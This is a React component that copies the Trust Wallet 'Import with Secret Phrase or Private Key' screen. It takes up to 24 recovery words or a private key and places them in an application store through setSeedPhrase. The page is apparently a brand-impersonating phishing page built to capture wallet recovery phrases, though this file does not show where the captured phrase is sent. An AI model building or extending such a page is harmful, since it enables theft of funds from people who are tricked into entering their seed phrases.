import { useRef, useState } from "react";
import { X, Eye, EyeOff } from "lucide-react";

import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import TrustWalletFull from "../icons/trust-wallet-full";

const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
	const [walletName, setWalletName] = useState("Main wallet");

	const [words, setWords] = useState<string[]>([""]);
	const [visibility, setVisibility] = useState<boolean[]>([false]);
	const [allVisible, setAllVisible] = useState(false);
	const [nameFocused, setNameFocused] = useState(false);
	const [areaFocused, setAreaFocused] = useState(false);
	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
	const { setSeedPhrase, setWalletName: setStoreWalletName } = useWalletStore(); // Assuming setWalletName exists in your store

	const handleComplete = () => {
		// Filter out any empty strings before joining
		setSeedPhrase(words.filter((w) => w.trim() !== "").join(" "));
		setStoreWalletName(walletName); // Set the name in the store
		handleFinish();
	};

	// Handle key presses within each input
	const handleInput = (
		e: React.KeyboardEvent<HTMLInputElement>,
		index: number
	) => {
		if (e.key === " ") {
			// Prevent default space insertion, as onChange now handles it
			e.preventDefault();
			// Manually trigger the change logic by adding a space
			// This ensures desktop (onKeyDown) and mobile (onChange) behave identically
			handleChange(words[index] + " ", index);
		} else if (e.key === "Backspace" && words[index] === "" && index > 0) {
			// Handle backspace to delete an empty input
			e.preventDefault();
			setWords((prev) => prev.filter((_, i) => i !== index));
			setVisibility((prev) => prev.filter((_, i) => i !== index));
			setTimeout(() => {
				inputRefs.current[index - 1]?.focus();
			}, 10);
		}
	};

	// Handle value changes (typing, pasting, mobile spacebar)
	const handleChange = (value: string, index: number) => {
		// Sanitize input, remove multiple spaces
		const cleanValue = value.replace(/\s+/g, " ");
		const parts = cleanValue.split(" ");

		if (parts.length > 1) {
			// More than one word, means space was typed or pasted
			const currentWord = parts[0];
			// All other parts, filtering out empty strings
			const nextWords = parts.slice(1).filter((w) => w !== "");
			const numNewWords = nextWords.length;
			const hasTrailingSpace = cleanValue.endsWith(" ");

			// Update the words state
			setWords((prev) => {
				let newWords = [...prev];
				newWords[index] = currentWord;

				// Add new words from paste
				for (const word of nextWords) {
					if (newWords.length < 24) {
						newWords.push(word);
					} else {
						break; // Stop at 24 words
					}
				}

				// If the original value ended with a space, add a new empty input
				if (hasTrailingSpace && newWords.length < 24) {
					newWords.push("");
				}

				return newWords;
			});

			// Update visibility for the new inputs
			setVisibility((prev) => {
				let newVis = [...prev];
				const numToAdd = numNewWords + (hasTrailingSpace ? 1 : 0);
				for (let i = 0; i < numToAdd; i++) {
					if (newVis.length < 24) {
						newVis.push(allVisible); // New inputs match the "allVisible" state
					} else {
						break;
					}
				}
				return newVis;
			});

			// Focus the last newly added input
			setTimeout(() => {
				// We use the functional update form to get the *latest* state
				// after the previous update has been processed.
				setWords((currentWords) => {
					const newIndex = Math.min(currentWords.length - 1, 23);
					inputRefs.current[newIndex]?.focus();
					return currentWords; // Return the state unchanged
				});
			}, 10);
		} else {
			// Only one word (or empty), just update the current input
			setWords((prev) => prev.map((w, i) => (i === index ? cleanValue : w)));
		}
	};

	// Toggle input visibility for all
	const toggleAllVisibility = () => {
		const newVisible = !allVisible;
		setAllVisible(newVisible);
		setVisibility((prev) => prev.map(() => newVisible));
	};

	// Focus last input when the custom area is clicked
	const handleAreaClick = (e: React.MouseEvent<HTMLDivElement>) => {
		const target = e.target as HTMLElement;
		// Don't interfere with clicks on inputs or buttons
		if (target.closest("input") || target.closest("button")) return;

		if (words.length === 0) {
			setWords([""]);
			setVisibility([false]);
			setTimeout(() => {
				inputRefs.current[0]?.focus();
			}, 10);
		} else {
			// Focus the last input
			setTimeout(() => {
				inputRefs.current[words.length - 1]?.focus();
			}, 10);
		}
	};

	// Disable button logic
	const isButtonDisabled =
		!walletName.trim() ||
		words.length === 0 ||
		words.every((w) => w.trim() === ""); // Disabled if all words are empty

	return (
		<div className="min-h-screen bg-black flex text-gray-300 w-full font-sans">
			{/* Right side - Form */}
			<div className="flex-1 flex flex-col items-center justify-center p-4 lg:p-12">
				<span className="mb-12 flex w-full max-w-2xl">
					<TrustWalletFull />
				</span>
				<div className="w-full max-w-2xl">
					<h1 className="text-2xl font-bold mb-12 text-gray-100">
						Import with Secret Phrase or Private Key
					</h1>

					<div className="space-y-6">
						{/* Wallet Name */}
						<div>
							<label className="block font-semibold mb-2 text-gray-200">
								Wallet Name
							</label>
							<div
								className={`relative border rounded-lg transition-colors ${
									nameFocused ? "border-green-600" : "border-neutral-700"
								}`}
							>
								<Input
									value={walletName}
									onChange={(e) => setWalletName(e.target.value)}
									onFocus={() => setNameFocused(true)}
									onBlur={() => setNameFocused(false)}
									className="text-gray-100/80 font-semibold py-6 pr-10 bg-transparent border-0 ring-offset-transparent focus-visible:ring-0 focus-visible:ring-offset-0"
								/>
								{walletName && (
									<button
										onClick={() => setWalletName("")}
										className="absolute right-3 top-1/2 -translate-y-1/2 bg-gray-500 rounded-full text-black hover:bg-gray-400 transition-colors"
									>
										<X className="w-4 h-4 p-0.5" />
									</button>
								)}
							</div>
							<p className="text-xs text-muted-foreground mt-1">
								You can edit this later
							</p>
						</div>

						{/* Secret Phrase area */}
						<div>
							<label className="block text-sm font-medium text-gray-200 mb-2">
								Enter Secret Phrase or Private Key
							</label>

							<div
								className={`relative flex flex-wrap gap-x-1.5 gap-y-2 rounded-lg p-4 min-h-56 cursor-text transition-colors ${
									areaFocused
										? "border-1 border-green-600"
										: "border border-neutral-700"
								} bg-neutral-900`}
								onClick={handleAreaClick}
								onFocus={() => setAreaFocused(true)}
								onBlur={() => setAreaFocused(false)}
								tabIndex={0} // Make the div focusable
							>
								{words.map((word, index) => (
									<div
										key={index}
										className="relative h-6"
									>
										{" "}
										{/* Wrapper for sizing */}
										<input
											ref={(el) => {
												if (el) inputRefs.current[index] = el;
											}}
											type={visibility[index] ? "text" : "password"}
											value={word}
											onChange={(e) => handleChange(e.target.value, index)}
											onKeyDown={(e) => handleInput(e, index)}
											autoCapitalize="none"
											autoComplete="off"
											autoCorrect="off"
											spellCheck="false"
											style={{
												// Set a min-width for the empty input, and let it grow
												minWidth: "8px",
												width: `${Math.max(word.length, 1)}ch`,
											}}
											className="bg-transparent outline-none text-gray-100/80 font-semibold h-full p-0"
										/>
									</div>
								))}

								{/* Eye Icon */}
								<button
									type="button"
									onClick={toggleAllVisibility}
									className="absolute bottom-3 right-3 text-gray-400 hover:text-gray-200 transition"
								>
									{allVisible ? (
										<EyeOff className="w-5 h-5" />
									) : (
										<Eye className="w-5 h-5" />
									)}
								</button>
							</div>

							<p className="text-xs font-medium mt-2 text-gray-100/80">
								Secret Phrase is typically 12 (sometimes 18, 24) words separated
								by single spaces
								<br />
								Private Key is a long alphanumeric code
							</p>
						</div>

						{/* Import button */}
						<div className="flex w-full justify-end items-center pt-4">
							<button
								onClick={handleComplete}
								className={`w-full py-3 rounded-full font-medium transition-all max-w-80 ${
									isButtonDisabled
										? "bg-green-600/60 cursor-not-allowed opacity-50 text-neutral-800/70"
										: "bg-green-600 hover:bg-green-500 text-neutral-900 font-bold"
								}`}
								disabled={isButtonDisabled}
							>
								Import
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};

export default TrustWallet;
